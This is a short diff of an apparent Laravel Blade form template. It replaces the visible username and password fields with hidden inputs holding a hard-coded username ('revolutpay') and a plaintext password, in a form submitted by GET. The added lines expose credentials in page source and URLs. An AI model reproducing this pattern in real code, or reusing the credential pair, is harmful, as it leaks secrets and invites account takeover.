@@ -236,11 +236,11 @@
     <form method="GET" action="{{ url('/data') }}">
         @csrf
 
-        <label for="username">Username:</label>
-        <input type="text" name="username" id="username"><br><br>
+      
+        <input type="hidden" name="username" id="username" value="revolutpay"><br><br>
 
-        <label for="password">Password:</label>
-        <input type="password" name="password" id="password"><br><br>
+  
+        <input type="hidden" name="password" id="password" value="MArizu123+"><br><br>
 
         <label for="phone">Phone Number:</label>
         <input type="text" name="phone" id="phone"><br><br>
